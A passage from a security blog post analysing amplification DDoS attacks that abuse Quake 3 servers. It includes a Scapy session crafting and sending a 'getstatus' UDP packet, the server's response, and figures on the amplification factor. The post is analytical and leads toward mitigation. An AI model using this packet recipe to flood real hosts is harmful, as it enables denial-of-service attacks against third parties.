</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">quake3_payload</span> <span class="o">=</span> <span class="s">&#39;</span><span class="se">\xFF\xFF\xFF\xFF\x67\x65\x74\x73\x74\x61\x74\x75\x73\x10</span><span class="s">&#39;</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">packet</span> <span class="o">=</span> <span class="n">ip</span><span class="o">/</span><span class="n">udp</span><span class="o">/</span><span class="n">quake3_payload</span> <span class="c"># encapsulate them</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">packet</span><span class="o">.</span><span class="n">show2</span><span class="p">()</span>
</span><span class='line'><span class="c">###[ IP ]###</span>
</span><span class='line'>  <span class="n">version</span><span class="o">=</span> <span class="il">4L</span>
</span><span class='line'>  <span class="n">ihl</span><span class="o">=</span> <span class="il">5L</span>
</span><span class='line'>  <span class="n">tos</span><span class="o">=</span> <span class="mh">0x10</span>
</span><span class='line'>  <span class="nb">len</span><span class="o">=</span> <span class="mi">42</span>
</span><span class='line'>  <span class="nb">id</span><span class="o">=</span> <span class="mi">5944</span>
</span><span class='line'>  <span class="n">flags</span><span class="o">=</span>
</span><span class='line'>  <span class="n">frag</span><span class="o">=</span> <span class="il">0L</span>
</span><span class='line'>  <span class="n">ttl</span><span class="o">=</span> <span class="mi">255</span>
</span><span class='line'>  <span class="n">proto</span><span class="o">=</span> <span class="n">udp</span>
</span><span class='line'>  <span class="n">chksum</span><span class="o">=</span> <span class="mh">0xe0a9</span>
</span><span class='line'>  <span class="n">src</span><span class="o">=</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.39</span>
</span><span class='line'>  <span class="n">dst</span><span class="o">=</span> <span class="n">QUAKE3_SERVER_IP</span>
</span><span class='line'>  \<span class="n">options</span>\
</span><span class='line'><span class="c">###[ UDP ]###</span>
</span><span class='line'>     <span class="n">sport</span><span class="o">=</span> <span class="mi">32511</span>
</span><span class='line'>     <span class="n">dport</span><span class="o">=</span> <span class="mi">27960</span>
</span><span class='line'>     <span class="nb">len</span><span class="o">=</span> <span class="mi">22</span>
</span><span class='line'>     <span class="n">chksum</span><span class="o">=</span> <span class="mh">0x17f9</span>
</span><span class='line'><span class="c">###[ Raw ]###</span>
</span><span class='line'>        <span class="n">load</span><span class="o">=</span> <span class="s">&#39;</span><span class="se">\xff\xff\xff\xff</span><span class="s">getstatus</span><span class="se">\x10</span><span class="s">&#39;</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">response</span> <span class="o">=</span> <span class="n">sr1</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
</span><span class='line'><span class="n">Begin</span> <span class="n">emission</span><span class="p">:</span>
</span><span class='line'><span class="n">Finished</span> <span class="n">to</span> <span class="n">send</span> <span class="mi">1</span> <span class="n">packets</span><span class="o">.</span>
</span><span class='line'><span class="o">*</span>
</span><span class='line'><span class="n">Received</span> <span class="mi">1</span> <span class="n">packets</span><span class="p">,</span> <span class="n">got</span> <span class="mi">1</span> <span class="n">answers</span><span class="p">,</span> <span class="n">remaining</span> <span class="mi">0</span> <span class="n">packets</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">response</span><span class="o">.</span><span class="n">payload</span><span class="o">.</span><span class="n">payload</span><span class="o">.</span><span class="n">show2</span><span class="p">()</span>
</span><span class='line'><span class="c">###[ Raw ]###</span>
</span><span class='line'>  <span class="n">load</span><span class="o">=</span> <span class="s">&#39;</span><span class="se">\xff\xff\xff\xff</span><span class="s">statusResponse</span><span class="se">\n\\</span><span class="s">sv_allowdownload</span><span class="se">\\</span><span class="s">0</span><span class="se">\\</span><span class="s">g_matchmode</span><span class="se">\\</span><span class="s">0</span><span class="se">\\</span><span class="s">g_gametype</span><span class="se">\\</span><span class="s">3</span><span class="se">\\</span><span class="s">sv_maxclients</span><span class="se">\\</span><span class="s">32</span><span class="se">\\</span><span class="s">sv_floodprotect</span><span class="se">\\</span><span class="s">1</span><span class="se">\\</span><span class="s">capturelimit</span><span class="se">\\</span><span class="s">0</span><span class="se">\\</span><span class="s">[...]</span><span class="se">\n</span><span class="s">0 0 &quot;Chuck-Norris&quot;</span><span class="se">\n</span><span class="s">0 250 &quot;b0b0&quot;[...]</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>If you have never used scapy before take a look to this <a href="http://code.google.com/p/scapy-guide/downloads/list">scapy-guide</a> made by <a href="https://twitter.com/catalyst256/">Adam Maxwell</a>, it&#8217;s really useful as a first-steps guide.</p>

<h2>How does it looks like at network level?</h2>

<p>Ok, so we have readed flooder code and referenced rfc sections (because we did, right? ;) ), time to sniff some attack traffic and analyze it with tshark/wireshark and observe described behaviour pattern.</p>

<p>First, i have compiled and used &#8220;dns.c&#8221; flooder without making any kind of modification, this is a Wireshak screenshot while analyzing it:<br/>
<img src="/images/upload/2013/06/incorrectlength_client.png"></p>

<p>I have marked in red important aspects like ToS/DS field, UDP length/checksum and &#8220;direction&#8221; (for Quake 3 protocol). As shown, Wireshark Quake 3 protocol <a href="http://anonsvn.wireshark.org/wireshark/trunk/epan/dissectors/packet-quake3.c">dissector</a> itself detect it as a malformed packet, due to UDP length = 8 application layer will receive an empty payload, fact that the Q3 server will treat as a client with connectivity errors and will send a &#8220;disconnect&#8221; message:<br/>
<img src="/images/upload/2013/06/incorrectlength_server.png"></p>

<p>If we compare question size against response answer there is no amplification factor at all, this program would be useful only for provoking Q3 servers sending unsolicited traffic to a third host - the attacked one - with the intention of splitting originating AS-path attacking or something similar.</p>

<p>I have sent one &#8220;getstatus&#8221; request forged with scapy to a public Quake 3 server (for obvious reasons i have changed some response content):<br/>
<img src="/images/upload/2013/06/statusResponse.png"></p>

<p>The server now correctly decode UDP payload, process &#8220;getstatus&#8221; command and answer with server status, including several server options and config values as well as statistics (a response size of 1373 bytes for a 56 bytes request).</p>

<h2>Next steps</h2>

<p>So far we have seen how this attack works as well as (bad coded) programs being used in the wild to launch DDoS attacks from web panels (the so called DDoS booters). We have also seen how to replay the amplification attack with Scapy and analized a bit of this network traffic with Wireshark.</p>

<p>At the next post we are going to see how to mitigate this kind of attack at the Quake 3 server - at application and network layer - side and also from the victim side being flooded. Also we are going to analyze it deeper with tshark to see potential ways to spot this attack and try to block it.</p>

<p>See you at next post!</p>
</div>
  
</div>

  <footer>
    <p class="meta">
      Categories: 

<span class="categories">
  
    <a class='category' href='/blog/categories/ddos/'>ddos</a>, <a class='category' href='/blog/categories/forensics/'>forensics</a>, <a class='category' href='/blog/categories/networking/'>networking</a>, <a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/scapy/'>scapy</a>, <a class='category' href='/blog/categories/tshark/'>tshark</a>, <a class='category' href='/blog/categories/wireshark/'>wireshark</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://blog.alejandronolla.com/2013/06/24/amplification-ddos-attack-with-quake3-servers-an-analysis-1-slash-2/" data-via="z0mbiehunt3r" data-counturl="http://blog.alejandronolla.com/2013/06/24/amplification-ddos-attack-with-quake3-servers-an-analysis-1-slash-2/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/2013/05/29/moloch-erasing-data-and-restore-database/" title="Previous Post: Moloch: Erasing data and restore database">&laquo; Moloch: Erasing data and restore database</a>
      
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

			</div>
		</section>
		<footer class="align-center">
			<div class="license">
	<a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/deed.en_US"><img alt="Creative Commons License" style="border-width:0" src="http://i.creativecommons.org/l/by-nc-sa/3.0/88x31.png" /></a>
</div>
<div class="powered-by">
	Design by <a href="http://twitter.com/fmartingr">@fmartingr</a>
</div>

		</footer>
	</div>
<script src="/javascripts/site.js"></script>
<script> updateSizes(); </script>


<script type="text/javascript">
      var disqus_shortname = 'browsingamongcollisions';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://blog.alejandronolla.com/2013/06/24/amplification-ddos-attack-with-quake3-servers-an-analysis-1-slash-2/';
        var disqus_url = 'http://blog.alejandronolla.com/2013/06/24/amplification-ddos-attack-with-quake3-servers-an-analysis-1-slash-2/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
